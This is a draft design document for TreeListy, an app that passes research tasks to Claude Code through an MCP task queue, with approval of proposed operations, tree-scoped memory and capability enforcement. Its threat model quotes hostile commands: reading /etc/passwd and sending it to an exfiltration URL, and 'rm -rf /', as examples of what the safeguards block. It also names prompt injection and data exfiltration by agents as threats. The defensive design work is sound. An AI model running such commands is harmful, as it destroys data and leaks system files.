# Bidirectional MCP Agent Dispatch Design

**Date:** 2025-12-21
**Status:** Draft
**Author:** geej + Claude Code
**Reviewed by:** Gemini, OpenAI (architectural feedback incorporated)

## Problem Statement

Current MCP architecture is backwards for the 90% use case:
- Users spend 90% of time in TreeListy UI
- Claude Code CLI has powerful capabilities (WebSearch, file access, full toolkit)
- MCP currently only lets Claude Code control TreeListy
- Treebeard (TB) cannot leverage Claude Code's capabilities

**Goal:** Let TreeListy dispatch tasks to Claude Code, making TB appear intelligent while Claude Code does the heavy lifting.

## Core Concept

```
┌─────────────────────────────────────────────────────────┐
│                      TreeListy UI                        │
│                                                          │
│  [Chat]  [Agent Button]  [Right-click menu]             │
│      │         │              │                          │
│      └─────────┴──────────────┘                          │
│                 │                                        │
│         AgentDispatcher                                  │
│                 │                                        │
└─────────────────┼────────────────────────────────────────┘
                  │ MCP WebSocket (bidirectional)
                  ▼
┌─────────────────────────────────────────────────────────┐
│                    Claude Code CLI                       │
│                                                          │
│  Receives task → Executes with full toolkit → Returns   │
│  (WebSearch, files, bash, git, etc.)                    │
└─────────────────────────────────────────────────────────┘
```

The MCP bridge becomes bidirectional: accepts commands AND sends task requests.

## Technical Protocol: Task Queue Model

### The MCP Compliance Challenge

**Risk (from OpenAI review):** If we invent "server pushes requests to Claude Code," we break MCP's client↔server contract and create a bespoke RPC hairball.

**Solution:** Keep MCP's natural direction. Claude Code *pulls* tasks via tools; bridge never pushes.

### Task Queue Architecture

```
┌─────────────────┐                           ┌─────────────────┐
│    TreeListy    │                           │   Claude Code   │
│    (Browser)    │                           │    (Client)     │
│                 │      WebSocket            │                 │
│  User: "Research│ ─────────────────────►    │                 │
│   Nixon"        │    task.submit()          │                 │
│                 │                           │                 │
│                 │      MCP Tools            │                 │
│                 │ ◄─────────────────────    │  polls:         │
│  Bridge/Server  │    tasks.claimNext()      │  "any tasks?"   │
│  (task queue)   │                           │                 │
│                 │ ◄─────────────────────    │  works...       │
│                 │    tasks.progress()       │                 │
│                 │                           │                 │
│                 │ ◄─────────────────────    │  returns ops    │
│  Inbox shows    │    tasks.complete()       │                 │
│  proposed ops   │    (with proposed_ops[])  │                 │
└─────────────────┘                           └─────────────────┘
```

### MCP Tools (Bridge exposes these)

```javascript
// Claude Code calls these via standard MCP
tools: [
  {
    name: "tasks.claimNext",
    description: "Get next pending task matching your capabilities",
    inputSchema: {
      capabilities: ["webSearch", "fileRead", ...]  // What CC can do
    },
    returns: { task: {...} | null }
  },
  {
    name: "tasks.progress",
    description: "Report progress on current task",
    inputSchema: {
      taskId: "string",
      message: "string",
      percent: "number"
    }
  },
  {
    name: "tasks.complete",
    description: "Complete task with proposed operations",
    inputSchema: {
      taskId: "string",
      proposed_ops: [...],  // Never direct writes
      summary: "string"
    }
  }
]
```

**Benefits:**
- 100% MCP compliant (client calls tools on server)
- No custom bidirectional protocol
- Bridge is just a task queue
- Claude Code works at its own pace

### The Ghost Agent Pattern (Refined)

1. **User:** "Research Nixon" (in Browser)
2. **TreeListy:** Submits task to Bridge queue
3. **Claude Code:** Polls `tasks.claimNext()`, gets task
4. **Claude Code:** Works (WebSearch, files, synthesis)
5. **Claude Code:** Calls `tasks.progress()` with updates
6. **Claude Code:** Calls `tasks.complete()` with `proposed_ops[]`
7. **Bridge:** Forwards proposed ops to TreeListy Inbox
8. **User:** Reviews and approves in Inbox

### Task Envelope (Standardized Now)

Every task uses this schema from Day 1:

```javascript
{
  // Identity
  taskId: "task-uuid-123",
  treeId: "root",
  conversationId: "conv-456",  // For multi-turn

  // Origin
  origin: "chat" | "button" | "context-menu",
  requestedCapabilities: ["webSearch", "treeWrite"],
  interactionStyle: "autonomous" | "conversational",

  // Agent definition
  agentId: "research-lifetree",
  systemPrompt: "You are a Research Agent...",
  userMessage: "Research Nixon for a LifeTree",

  // Context
  targetNodeId: "phase-123",  // Where to apply results
  treeContext: { ... },       // Relevant subtree
  agentMemory: { ... }        // From _agentContext
}
```

### Event Stream

Tasks emit typed events for UI updates:

```javascript
// Progress
{ type: "status", message: "Searching sources..." }
{ type: "log", detail: "Found wikipedia.org/Nixon" }

// Interaction
{ type: "clarification", question: "Include family details?", options: [...] }

// Results
{ type: "proposed_ops", ops: [...] }
{ type: "summary", text: "Created 5 phases with 23 nodes" }

// Errors
{ type: "error", code: "TIMEOUT", retryable: true }
```

### Concurrency

- Bridge queues tasks
- Claude Code processes one at a time (single-threaded)
- Non-CC agents (Gemini, ChatGPT) can run in parallel
- Each task has isolated event stream (no interleaving)

## Use Cases

1. **Research & Build** - "Research X topic and create a tree structure"
2. **Analyze & Enhance** - Take existing branch and enrich with real data
3. **Multi-step Workflows** - Complex agent tasks with multiple stages

## Entry Points

Users can trigger agent tasks via:

1. **Chat with Treebeard** - Natural language: "Research Nixon and build a LifeTree"
2. **Agent Button** - Explicit "Run Agent" button with task picker
3. **Context Menu** - Right-click node → "Enhance with research" / "Deep dive"

## Conversation Model: TB as Translator

Full conversational relay between user and Claude Code, with TB as liaison.

```
┌──────────────────────────────────────────────────────────┐
│                   User's Experience                       │
│                                                           │
│  User: "Research Nixon for a LifeTree"                   │
│  TB: "What aspects interest you most?"                   │  ← CC asked this
│  User: "Foreign policy and Watergate"                    │
│  TB: "Researching... found 12 sources"                   │  ← CC streaming
│  TB: "Here's the structure. Want more on China trip?"    │  ← CC offering
│  User: "Yes, and add his key quotes"                     │
│  TB: "Enhanced. Nixon LifeTree complete."                │
│                                                           │
│  [User sees ONE conversation with TB]                    │
│  [Reality: CC did the research, TB relayed]              │
└──────────────────────────────────────────────────────────┘
```

**Key behaviors:**
- TB recognizes when it needs Claude Code's capabilities
- Opens relay channel, forwards user intent
- CC responses come back as "TB messages"
- User sees seamless conversation
- TB handles simple things directly, only dispatches when needed

## Multi-Agent Orchestration

TB becomes an orchestrator that can route to different AI backends.

```
┌─────────────────────────────────────────────────────────┐
│                    Treebeard                             │
│                   (Orchestrator)                         │
│                                                          │
│   "What does this task need?"                           │
│         │                                                │
│    ┌────┴────┬──────────┬──────────┐                    │
│    ▼         ▼          ▼          ▼                    │
│ Claude    Claude     Gemini    ChatGPT                  │
│  Code      API        API        API                    │
│(research) (analysis) (images)  (writing)                │
└─────────────────────────────────────────────────────────┘
```

**Debate Mode with Multiple Agents:**
```
User: "Debate Nixon's legacy"

TB dispatches to 3 agents simultaneously:
  → Claude (Historian): "Nixon's realpolitik reshaped..."
  → Gemini (Critic): "Watergate permanently damaged..."
  → ChatGPT (Defender): "His China opening was visionary..."

TB weaves responses into Debate tree structure
```

**Task routing examples:**
- Research → Claude Code (has WebSearch)
- Image generation → Gemini (Imagen)
- Long-form writing → Claude API
- Quick analysis → Fastest available

## Interaction Patterns

### Adaptive Feedback
- **Quick tasks (<30s):** Stream results live, nodes appear in real-time
- **Long tasks (>30s):** Move to background, notify when done

### Clarifications
Configurable per task:
- **"Just do it"** - Agent makes best guess, user refines after
- **"Ask along the way"** - Agent pauses for clarification at decision points

### Result Integration: Proposed Operations Inbox

**Critical safety rule (from OpenAI):** Agents NEVER write directly to tree. They return proposed operations.

```javascript
// Agent returns this (never raw tree data)
{
  proposed_ops: [
    { op: "create_node", parentId: "root", data: { name: "Early Life", ... } },
    { op: "create_node", parentId: "phase-1", data: { name: "Birth", ... } },
    { op: "set_field", nodeId: "phase-1", field: "description", value: "..." },
    { op: "add_child", parentId: "phase-2", data: { name: "Presidency", ... } }
  ],
  rationale: "Created 4 nodes covering Nixon's early life and political rise",
  sources: ["wikipedia.org/Nixon", "millercenter.org"],
  confidence: 0.85
}
```

### The Inbox UI

```
┌─────────────────────────────────────────────────────────┐
│  📥 INBOX                                    2 pending  │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  🔬 Research: Nixon LifeTree                            │
│  Agent: research-lifetree • 2 min ago                   │
│                                                          │
│  Proposed changes:                                       │
│  ├─ + Create "Early Life (1913-1934)"                   │
│  │   └─ + Create "Birth in Yorba Linda"                 │
│  │   └─ + Create "Quaker Upbringing"                    │
│  ├─ + Create "Political Rise (1946-1960)"               │
│  │   └─ + Create "Congress & Hiss Case"                 │
│  └─ + Create "Presidency (1969-1974)"                   │
│                                                          │
│  Sources: wikipedia.org, millercenter.org, history.gov  │
│                                                          │
│  [Preview Diff]  [Approve All]  [Reject]  [Edit First]  │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

**Interaction modes:**
- **Approve All:** Apply all ops atomically (single `saveState()`)
- **Reject:** Discard all ops, optionally give feedback
- **Edit First:** Open ops in editor, modify before applying
- **Preview Diff:** Show visual before/after

**Auto-approve option** (for trusted agents):
```
☐ Auto-approve results from this agent
☐ Auto-approve for enhancements (low-risk ops only)
```

## Tree-Scoped Agent Memory

Memory persists across sessions but isolated per tree.

### Governed `_agentContext` Schema

**Guardrails (from OpenAI):** Version it, cap it, add provenance.

```javascript
{
  "id": "root",
  "name": "Richard Nixon (1913-1994)",
  "pattern": "lifetree",
  "children": [...],

  // Agent memory - governed payload
  "_agentContext": {
    // Version for future migrations
    "v": 1,

    // Provenance (who/what generated this)
    "generatedBy": "research-lifetree",
    "model": "claude-opus-4-5-20251101",
    "lastUpdated": "2025-12-21T07:30:00Z",

    // Summary (capped, auto-compacted)
    "summary": "Building comprehensive Nixon LifeTree focused on foreign policy",

    // Sources (separate from conversation)
    "sources": [
      { "url": "wikipedia.org/Nixon", "accessed": "2025-12-21", "used": true },
      { "url": "millercenter.org", "accessed": "2025-12-21", "used": true }
    ],

    // User decisions (preserved across sessions)
    "decisions": [
      "User prefers chronological structure",
      "Focus on foreign policy over domestic"
    ],

    // Conversation highlights (capped to last N)
    "conversationHighlights": [
      "User wants China trip details",
      "Skip childhood, emphasize presidency"
    ],

    // Size tracking
    "_sizeBytes": 2048,
    "_maxBytes": 51200  // 50KB cap
  }
}
```

### Memory Governance Rules

| Rule | Implementation |
|------|----------------|
| **Size cap** | Max 50KB; auto-summarize when exceeded |
| **Versioning** | `v: 1` field for future migrations |
| **Provenance** | Track which agent/model generated content |
| **Separation** | Sources vs highlights vs decisions |
| **Export toggle** | User can choose "export without agent context" |
| **Compaction** | Old highlights summarized, recent kept verbatim |

**Benefits:**
- Export tree → memory comes with it (unless toggled off)
- Share tree → collaborator gets context
- Different trees = isolated memory (Nixon knows nothing about CAPEX)
- Memory builds incrementally across sessions
- No accidental data exfiltration via bloated context

## Agent Definitions

### Storage Model
- **Global built-ins:** Ship with TreeListy (Research LifeTree, Analyze Document, etc.)
- **User custom (global):** Saved in localStorage, available across trees
- **Tree-specific:** Stored as special nodes in tree, travel with export

### Agent Template Structure
```javascript
{
  "id": "research-lifetree",
  "name": "Research LifeTree",
  "description": "Research a person and build a biographical LifeTree",
  "icon": "🔬",
  "scope": "global",  // or "tree-specific"
  "interactionStyle": "conversational",  // or "autonomous"
  "resultHandling": "preview",  // or "auto-apply"
  "promptTemplate": "Research {subject} and create a LifeTree structure...",

  // Capabilities Manifest (security - must declare what it uses)
  "requiredCapabilities": ["webSearch", "treeWrite"],
  "requiresLocalBridge": true,  // Desktop only, or false for API-only agents

  // Platform availability
  "platforms": {
    "desktop": true,   // Uses Claude Code via MCP
    "mobile": false    // Cannot run without local bridge
  }
}
```

### Agent Capability Types

| Capability | Description | Requires Local Bridge |
|------------|-------------|----------------------|
| `webSearch` | Search the web for information | Yes (Claude Code) |
| `webFetch` | Fetch and parse URLs | Yes (Claude Code) |
| `fileRead` | Read local files | Yes (Claude Code) |
| `fileWrite` | Write/create files | Yes (Claude Code) |
| `shellExec` | Run shell commands | Yes (Claude Code) |
| `treeWrite` | Modify the tree | No (browser can do) |
| `treeRead` | Read tree data | No (browser can do) |
| `imageGen` | Generate images | No (Gemini API) |
| `analysis` | Analyze/summarize | No (any AI API) |

## Platform Modes: Desktop vs Mobile

### Desktop Mode (Full Power)
```
Browser ↔ Localhost Bridge ↔ Claude Code CLI
         (WebSocket)         (Full toolkit)
```

### Mobile Mode (API Fallback)
```
Mobile Browser ↔ Netlify Function ↔ Anthropic API
                 (or Firebase)      (Limited - no WebSearch)
```

**Key insight:** Claude Code CLI cannot run on iOS/Android. Mobile must fall back to raw API calls.

**Agent availability by platform:**

| Agent Type | Desktop | Mobile |
|------------|---------|--------|
| Deep Research (WebSearch) | ✅ | ❌ Desktop only |
| Summarization | ✅ | ✅ |
| Tree structuring | ✅ | ✅ |
| Image generation | ✅ | ✅ (Gemini API) |
| File operations | ✅ | ❌ Desktop only |

**UI indication:**
```
[🔬 Deep Research]     ← Shows "Requires Desktop" badge on mobile
[✨ Summarize Branch]  ← Works everywhere
[🖼️ Generate Image]   ← Works everywhere
```

## Disconnected Behavior

When Claude Code isn't running:

1. **Notify gracefully:** "Claude Code not connected. Start it to use this feature."
2. **Fallback to Treebeard:** TB does what it can with its own capabilities (API-only agents)
3. **Note limitations:** "I can help structure your ideas, but can't search the web without Claude Code connected."
4. **Show available agents:** Only display agents that work without local bridge

## Error Handling & Recovery

| Failure | User Experience | Recovery |
|---------|-----------------|----------|
| Claude Code disconnects mid-task | "Connection lost. Partial results saved." | Resume when reconnected |
| Web search times out | "Couldn't reach 2 sources. Continue with what we have?" | Retry or proceed |
| API rate limit | "Pausing 30s for rate limit..." | Auto-retry with backoff |
| Task too long (>5 min) | "Still working... (move to background?)" | User chooses |
| Partial success | "Found 3 of 5 topics. Add what we have?" | Preview partial results |

### Checkpointing
```
Every significant step → save to _agentContext

Step 1: Researched early life ✓ (saved)
Step 2: Researched presidency ✓ (saved)
Step 3: Researching Watergate... ✗ (disconnected)

[Reconnect]
TB: "Resume Nixon research? We completed 2/5 phases"
```

**Principles:**
- Never lose completed work
- Checkpoint progress to tree memory
- Offer resume, not restart
- Let user decide: retry, skip, or accept partial

## Security & Permissions

### The "Word Macro" Problem

**Risk (identified by Gemini):** Tree JSON with embedded agents is like a Word doc with macros. A malicious tree could contain an agent that exfiltrates data or runs destructive commands.

```
Attacker sends: nixon_research.json
Victim opens tree
Malicious agent auto-runs: cat /etc/passwd > exfil_url
```

### Threat Model

| Threat | Example | Mitigation |
|--------|---------|------------|
| Malicious shared tree | Tree has agent that runs `rm -rf /` | Safe Mode + Trust dialog |
| Undeclared capabilities | Agent uses `shellExec` without declaring it | Capabilities Manifest enforcement |
| Prompt injection | Node name contains hidden instructions | Sanitize inputs, sandbox prompts |
| Data exfiltration | Agent sends tree data to external URL | Allowlist for network destinations |
| Runaway costs | Agent loops infinitely, burns API credits | Budget limits per task |

### Safe Mode (Like Protected View in Office)

When opening a foreign tree (shared/imported):

```
┌─────────────────────────────────────────────────────────┐
│  ⚠️ SAFE MODE                                           │
│                                                          │
│  This tree was shared by someone else.                  │
│  Agents are disabled until you enable them.             │
│                                                          │
│  Tree contains 2 custom agents:                         │
│  • "Deep Research" - webSearch, fileWrite               │
│  • "Export to Cloud" - network, fileSystem              │
│                                                          │
│  [View Agent Code]  [Enable Agents]  [Keep Disabled]    │
└─────────────────────────────────────────────────────────┘
```

### Capabilities Manifest Enforcement

Agents must declare their capabilities upfront. If an agent tries to use undeclared capabilities, the Bridge blocks it:

```javascript
// Agent definition
{
  "id": "research-agent",
  "requiredCapabilities": ["webSearch", "treeWrite"]  // Declared
}

// At runtime:
Agent tries: shellExec("rm -rf /")
Bridge: "BLOCKED - shellExec not in capabilities manifest"
```

### Permission Tiers

```
┌─────────────────────────────────────────────────────────┐
│              User Permission Settings                    │
│                                                          │
│  ○ Minimal   - Web search only, read-only               │
│  ○ Standard  - Web search + file read + tree write      │
│  ◉ Full      - Everything Claude Code can do            │
│  ○ Custom    - Pick specific capabilities               │
│                                                          │
│  □ Always ask before:                                   │
│     ☑ Writing files outside project                     │
│     ☑ Running shell commands                            │
│     ☑ Accessing network beyond search                   │
│     ☑ Executing agents from shared trees                │
└─────────────────────────────────────────────────────────┘
```

### Shared Tree Agent Trust

```
[Opening shared tree with custom agents]

⚠️ This tree includes 2 custom agents:
   • "Deep Research" - uses web search, file write
   • "Export to Drive" - uses network, file system

Trust agents from "geej@prairie2cloud.com"?
   [Trust Once]  [Trust Always]  [Disable Agents]
```

**Principles:**
- Explicit consent for dangerous operations
- Shared agents sandboxed by default
- User controls permission level
- Audit log of agent actions

### Bridge as Policy Kernel

**Key insight (from OpenAI):** Security enforcement must be *mechanical*, not prompt-based.

The Bridge is the "syscall boundary" - all dangerous operations pass through it:

```javascript
// Bridge enforcement (not prompts)
function validateToolCall(agentId, toolName, params) {
  const agent = getAgentDefinition(agentId);
  const declared = agent.requiredCapabilities;

  // 1. Capability check
  if (!declared.includes(toolName)) {
    throw new Error(`BLOCKED: ${toolName} not in manifest`);
  }

  // 2. Path sandboxing (for file ops)
  if (toolName === 'fileWrite' && !isAllowedPath(params.path)) {
    throw new Error(`BLOCKED: write outside allowed dirs`);
  }

  // 3. Budget check
  if (getTaskBudget(params.taskId).exceeded) {
    throw new Error(`BLOCKED: task budget exceeded`);
  }

  // 4. Audit log
  auditLog.append({ agentId, toolName, params, timestamp: Date.now() });

  return true;  // Proceed
}
```

### Budget Limits

```javascript
// Per-task budgets
{
  maxDurationMs: 300000,    // 5 minutes
  maxTokens: 50000,         // Token budget
  maxToolCalls: 100,        // Prevent infinite loops
  maxNetworkRequests: 20    // Rate limit searches
}
```

### Audit Log

Every task produces an audit trail:

```javascript
{
  taskId: "task-123",
  agentId: "research-lifetree",
  events: [
    { t: 0, action: "task_claimed" },
    { t: 1200, action: "tool_call", tool: "webSearch", query: "Nixon..." },
    { t: 3400, action: "tool_call", tool: "webSearch", query: "China trip..." },
    { t: 8900, action: "task_complete", opsCount: 12 }
  ],
  budget: { tokensUsed: 12000, toolCalls: 5, durationMs: 8900 }
}
```

## Implementation Phases

### Phase 1: Task Queue + Proposed Ops
- Add `tasks.claimNext`, `tasks.progress`, `tasks.complete` tools to Bridge
- Implement task queue in Bridge
- Build Inbox UI for proposed operations
- Return proposed_ops from Claude Code (never direct writes)
- Single agent: research-lifetree

**Exit criteria:** User submits task in TB → CC claims → returns ops → Inbox shows → User approves → Tree updates

### Phase 2: Task Envelope + Streaming
- Implement full Task Envelope schema
- Add event streaming (status, log, clarification, proposed_ops)
- Build conversation relay for multi-turn tasks
- Checkpoint/resume on disconnect

**Exit criteria:** Long task shows live progress; disconnect mid-task preserves state; resume works

### Phase 3: Multi-Agent Orchestration
- Add agent routing logic to TB
- Integrate with existing Claude/Gemini/ChatGPT providers
- Implement parallel agent execution for Debate Mode
- Queue management for concurrent tasks

**Exit criteria:** User triggers Debate Mode → 3 agents run in parallel → Results merge into tree

### Phase 4: Memory + Governance
- Add `_agentContext` to tree schema with governance rules
- Implement size caps and compaction
- Add provenance tracking
- Export toggle for agent context

**Exit criteria:** Memory persists across sessions; shared tree has manageable context size

### Phase 5: Security + Polish
- Implement permission tiers
- Add Safe Mode for shared trees
- Build capabilities manifest enforcement
- Budget limits and audit logging
- Error handling and edge cases

**Exit criteria:** Malicious shared tree blocked; undeclared capabilities blocked; audit log works

## Verification Tests

From OpenAI's recommendations:

### Test 1: Concurrent Tasks
- Run two tasks simultaneously
- Verify no interleaving in UI (taskId-bound streams)
- Inbox shows two independent proposed-op bundles

### Test 2: Disconnect Recovery
- Start long task, kill Claude Code mid-execution
- Bridge persists checkpoints
- Reconnect → UI shows resumable state
- Resume completes task

### Test 3: Malicious Shared Tree
- Open shared tree with custom agents
- Trust prompt appears
- Dangerous capabilities disabled until explicitly enabled
- Undeclared capability use blocked by Bridge

## Resolved Questions (from Gemini Review)

| Question | Resolution |
|----------|------------|
| **Message format?** | Use MCP Sampling (`sampling/createMessage`). Standard protocol, supports system prompts, handles server-driving-client flow. |
| **Streaming?** | Use JSON-RPC `notifications/progress` for status updates during long tasks. |
| **Concurrency?** | Queue in Bridge. Claude Code is single-threaded; non-CC agents (Gemini) can run in parallel. |
| **Mobile?** | Two-tier: Desktop uses local bridge + Claude Code; Mobile falls back to API-only agents. Mark agents with `requiresLocalBridge`. |

## Remaining Open Questions

1. **Bridge state management:** How does Bridge handle Claude Code restarts mid-task?
2. **Agent versioning:** How to handle built-in agent updates without breaking user customizations?
3. **Cost tracking:** How to show users estimated/actual API costs per agent run?

## Architectural Insight

**From OpenAI:** This design is secretly becoming an **operating system primitive**:

| OS Concept | TreeListy Equivalent |
|------------|---------------------|
| Processes | Tasks |
| Syscall boundary | Inbox (proposed_ops approval) |
| Process memory | `_agentContext` |
| Kernel | Bridge (policy enforcement) |
| File system | Tree structure |

If we keep the kernel (Bridge) small and policy-driven, we can scale to arbitrary capability without UI entropy.

## Key Trade-offs

| Decision | Trade-off | Why we chose this |
|----------|-----------|-------------------|
| Task Queue (pull) vs Push RPC | Slightly less "magic" | Vastly more robust, MCP compliant |
| Proposed Ops Inbox | Adds friction | Prevents "agent silently rewrote my life system" |
| Memory in tree JSON | Bloat risk | Portability wins; governed with caps |
| Capability manifests | Agent authors must declare | Mechanical enforcement > prompt-based |

## Success Criteria

- User can research and build a LifeTree entirely from TreeListy UI
- TB feels intelligent even though Claude Code does the work
- Tree-scoped memory provides continuity across sessions
- Shared trees with agents are safe by default
- Graceful degradation when Claude Code unavailable
- Inbox prevents unreviewed writes to tree
- Bridge enforces capability boundaries mechanically
